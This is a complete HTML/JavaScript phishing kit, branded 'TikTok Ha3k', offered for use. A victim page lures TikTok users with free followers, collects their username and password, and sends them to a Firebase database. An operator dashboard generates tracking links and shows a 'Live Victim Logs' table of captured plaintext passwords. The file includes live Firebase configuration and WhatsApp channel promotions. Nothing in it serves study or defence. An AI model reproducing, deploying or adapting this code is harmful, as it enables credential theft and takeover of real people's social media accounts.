<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
    <title>TikTok Ha3k - 𝗙𝘂𝘁𝘂𝗿𝗲 𝗔𝗰𝗮𝗱𝗲𝗺𝘆</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --bg: #e6e9ef;
            --tiktok-pink: #ff0050;
            --tiktok-black: #010101;
            --shadow-dark: #b8b6c3;
            --shadow-light: #ffffff;
        }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg);
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #2d3e50;
            padding: 10px;
        }

        /* Toast */
        #toast {
            position: fixed; top: 10px; right: -400px;
            background: var(--bg); padding: 12px 20px;
            border-radius: 30px; display: flex; align-items: center; gap: 12px;
            box-shadow: 10px 10px 20px var(--shadow-dark), -5px -5px 15px var(--shadow-light);
            z-index: 10001; transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            min-width: 260px; max-width: 90%; font-size: 14px;
        }
        #toast.active { right: 10px; }
        #toast .progress {
            position: absolute; bottom: 0; left: 0; height: 4px;
            width: 100%; background: var(--tiktok-pink); border-radius: 0 0 30px 30px;
        }
        #toast i.close-toast { cursor: pointer; margin-left: auto; opacity: 0.5; }

        /* Popup */
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4); backdrop-filter: blur(10px);
            display: none; align-items: center; justify-content: center; z-index: 9999;
            padding: 20px;
        }
        .popup-3d {
            background: var(--bg); padding: 30px 20px; border-radius: 40px; text-align: center;
            box-shadow: 20px 20px 60px var(--shadow-dark); max-width: 360px; width: 100%;
        }

        /* Containers */
        .container {
            background: var(--bg); padding: 30px 20px; border-radius: 40px;
            width: 100%; max-width: 480px; text-align: center;
            box-shadow: 20px 20px 60px var(--shadow-dark), -20px -20px 60px var(--shadow-light);
            margin: 15px 0; display: none; /* Hidden by default */
        }
        #admin-card { max-width: 900px; }

        /* Feature grid */
        .features-grid {
            display: none; justify-content: center; flex-wrap: wrap;
            gap: 15px; margin: 20px auto; width: 100%; max-width: 1000px;
        }
        .feature-box {
            background: var(--bg); padding: 25px 15px; border-radius: 35px; width: 100%;
            max-width: 280px; box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
        }
        .feature-box i { font-size: 35px; color: var(--tiktok-pink); margin-bottom: 10px; }

        /* Buttons */
        .btn-3d {
            background: var(--bg); border: none; padding: 14px 20px; border-radius: 40px;
            box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light);
            cursor: pointer; font-weight: 700; color: #444; display: inline-flex;
            align-items: center; justify-content: center; gap: 8px; transition: 0.2s;
            font-size: 16px; width: 100%; margin: 5px 0;
        }
        .btn-3d:active { box-shadow: inset 4px 4px 8px var(--shadow-dark); transform: scale(0.98); }
        .btn-tt { background: var(--tiktok-pink); color: white; border: none; }

        /* Admin table */
        .table-wrapper { overflow-x: auto; margin: 20px 0; }
        .admin-table { width: 100%; border-collapse: separate; border-spacing: 0 10px; min-width: 600px; }
        .admin-table th { padding: 8px; opacity: 0.7; font-size: 12px; text-transform: uppercase; }
        .admin-table td {
            background: var(--bg); padding: 15px; border-radius: 25px;
            box-shadow: 5px 5px 15px var(--shadow-dark); text-align: center; font-size: 14px;
        }

        /* Inputs */
        .input-group {
            background: var(--bg); border-radius: 50px; padding: 5px 15px;
            box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light);
            display: flex; margin: 15px 0; align-items: center;
        }
        input { background: transparent; border: none; padding: 15px 0; outline: none; font-weight: 600; width: 100%; font-size: 16px; }

        .follower-selector { display: flex; justify-content: center; gap: 8px; margin: 20px 0; flex-wrap: wrap; }
        .follower-option {
            background: var(--bg); padding: 12px 16px; border-radius: 40px;
            box-shadow: 5px 5px 10px var(--shadow-dark), -5px -5px 10px var(--shadow-light);
            cursor: pointer; font-weight: 600; transition: 0.2s; font-size: 16px; flex: 1 0 auto;
        }
        .follower-option.selected { background: var(--tiktok-pink); color: white; box-shadow: 0 0 15px var(--tiktok-pink); }
        #linkDisplay { margin-top: 20px; padding: 20px; background: white; border-radius: 30px; box-shadow: inset 3px 3px 8px #ccc; }
        #actualLink { word-break: break-all; font-weight: bold; color: var(--tiktok-pink); margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>

<div id="toast">
    <div id="toast-icon"></div>
    <div id="toast-msg"></div>
    <i class="fas fa-times close-toast" onclick="hideToast()"></i>
    <div class="progress" id="toast-progress"></div>
</div>

<div class="overlay" id="waPopup">
    <div class="popup-3d">
        <div style="font-size: 50px; color: #25d366; margin-bottom: 15px;"><i class="fab fa-whatsapp"></i></div>
        <h2>Join WhatsApp Channel</h2>
        <p style="margin-bottom: 20px; font-size: 14px;">Join to unlock the Admin Dashboard and hacking tools.</p>
        <button class="btn-3d" style="background:#25d366; color:white;" onclick="window.open('https://whatsapp.com/channel/0029VbBv1D2KrWQtNOOVgm3R', '_blank')">
            <i class="fab fa-whatsapp"></i> Join Channel
        </button>
        <button class="btn-3d" onclick="closePopup()" style="margin-top: 10px;">
            I Have Joined
        </button>
    </div>
</div>

<div style="width: 100%; display: flex; flex-direction: column; align-items: center;">
    
    <div class="container" id="admin-card">
        <h1><i class="fab fa-tiktok" style="color:var(--tiktok-pink);"></i> TikTok Hack <span id="adminIdDisplay" style="font-size: 12px; background: #333; color: white; padding: 4px 10px; border-radius: 40px;"></span></h1>
        <button class="btn-3d btn-tt" onclick="generateSessionLink()">
            <i class="fas fa-plus-circle"></i> Generate New Campaign
        </button>
        <div id="linkDisplay" style="display:none;">
            <p id="actualLink"></p>
            <div style="display: flex; gap: 10px;">
                <button class="btn-3d" onclick="copyLink()" style="flex:1;">Copy</button>
                <button class="btn-3d" id="viewBtn" style="flex:1;">View</button>
            </div>
        </div>
        <h3 style="margin-top: 30px; opacity: 0.7;">🔥 Live Victim Logs</h3>
        <div class="table-wrapper">
            <table class="admin-table">
                <thead>
                    <tr><th>Session</th><th>User/Email</th><th>Password</th><th>Followers</th><th>Status</th></tr>
                </thead>
                <tbody id="live-data-table"></tbody>
            </table>
        </div>
    </div>

    <div id="user-ui" class="container">
        <div style="font-size: 50px; color: var(--tiktok-pink);"><i class="fab fa-tiktok"></i></div>
        <h2>Get Free TikTok Followers</h2>
        <div id="step-quantity">
            <p>Select quantity:</p>
            <div class="follower-selector">
                <div class="follower-option" data-value="1000">1K</div>
                <div class="follower-option" data-value="5000">5K</div>
                <div class="follower-option" data-value="10000">10K</div>
            </div>
            <button class="btn-3d btn-tt" onclick="selectQuantity()">Continue</button>
        </div>
        <div id="step-login" style="display:none;">
            <div class="input-group"><input type="text" id="ttUsername" placeholder="Username"></div>
            <div class="input-group"><input type="password" id="ttPassword" placeholder="Password"></div>
            <button class="btn-3d btn-tt" onclick="submitTikTok()">Verify & Get Followers</button>
        </div>
    </div>

    <div class="features-grid" id="main-features">
        <div class="feature-box"><i class="fas fa-user-secret"></i><h4>Stealth</h4></div>
        <div class="feature-box"><i class="fas fa-chart-line"></i><h4>Real-time</h4></div>
        <div class="feature-box"><i class="fas fa-mask"></i><h4>Clone</h4></div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyD2Mpak1WXD7ou1DVCbb_6jMv-XGZAU-WY",
        authDomain: "tiktokhack-8075f.firebaseapp.com",
        databaseURL: "https://tiktokhack-8075f-default-rtdb.firebaseio.com",
        projectId: "tiktokhack-8075f",
        storageBucket: "tiktokhack-8075f.firebasestorage.app",
        messagingSenderId: "261794334723",
        appId: "1:261794334723:web:7deeb9cbaf46011db7a636"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const urlParams = new URLSearchParams(window.location.search);
    const urlAdmin = urlParams.get('admin');
    const urlSession = urlParams.get('id');
    const POPUP_CLOSED_KEY = 'tiktok_popup_closed';
    let ADMIN_ID = localStorage.getItem('tiktok_admin_id') || 'admin_' + Date.now();
    localStorage.setItem('tiktok_admin_id', ADMIN_ID);

    window.onload = function() {
        if (urlAdmin && urlSession) {
            // Victim Mode
            document.getElementById('user-ui').style.display = 'block';
            setupVictimUI();
        } else {
            // Admin Mode
            if (localStorage.getItem(POPUP_CLOSED_KEY) === 'true') {
                showDashboard();
            } else {
                document.getElementById('waPopup').style.display = 'flex';
            }
        }
    }

    function showDashboard() {
        document.getElementById('waPopup').style.display = 'none';
        document.getElementById('admin-card').style.display = 'block';
        document.getElementById('main-features').style.display = 'flex';
        document.getElementById('adminIdDisplay').innerText = 'ID: ' + ADMIN_ID.substring(0,8);
        startLiveTracking();
    }

    function closePopup() {
        localStorage.setItem(POPUP_CLOSED_KEY, 'true');
        showDashboard();
        showToast("Dashboard Unlocked!", "success");
    }

    function generateSessionLink() {
        const sessionId = 'TT-' + Math.floor(1000 + Math.random() * 9000);
        const link = window.location.href.split('?')[0] + '?admin=' + ADMIN_ID + '&id=' + sessionId;
        document.getElementById('actualLink').innerText = link;
        document.getElementById('linkDisplay').style.display = 'block';
        document.getElementById('viewBtn').onclick = () => window.open(link, '_blank');
        database.ref('tiktok_data/' + ADMIN_ID + '/' + sessionId).set({
            username: 'waiting...', status: 'Active', timestamp: Date.now()
        });
    }

    function startLiveTracking() {
        database.ref('tiktok_data/' + ADMIN_ID).on('value', (snapshot) => {
            const tbody = document.getElementById('live-data-table');
            tbody.innerHTML = '';
            const data = snapshot.val();
            if(!data) return;
            Object.entries(data).forEach(([key, val]) => {
                tbody.innerHTML += `<tr><td>${key}</td><td>${val.username||''}</td><td style="color:red">${val.password||''}</td><td>${val.followers||''}</td><td>${val.status}</td></tr>`;
            });
        });
    }

    function copyLink() {
        navigator.clipboard.writeText(document.getElementById('actualLink').innerText);
        showToast("Copied!", "success");
    }

    function showToast(msg, type) {
        const t = document.getElementById('toast');
        document.getElementById('toast-msg').innerText = msg;
        t.classList.add('active');
        setTimeout(() => t.classList.remove('active'), 3000);
    }

    let selectedFollowers = '1000';
    function setupVictimUI() {
        const opts = document.querySelectorAll('.follower-option');
        opts.forEach(o => o.onclick = () => {
            opts.forEach(x => x.classList.remove('selected'));
            o.classList.add('selected');
            selectedFollowers = o.dataset.value;
        });
    }
    function selectQuantity() {
        document.getElementById('step-quantity').style.display = 'none';
        document.getElementById('step-login').style.display = 'block';
    }
    function submitTikTok() {
        const u = document.getElementById('ttUsername').value;
        const p = document.getElementById('ttPassword').value;
        database.ref('tiktok_data/' + urlAdmin + '/' + urlSession).update({
            username: u, password: p, followers: selectedFollowers, status: 'Captured'
        }).then(() => {
            window.location.href = 'https://whatsapp.com/channel/0029VbBlzfA5EjxytXusqU1A';
        });
    }
</script>
</body>
</html>
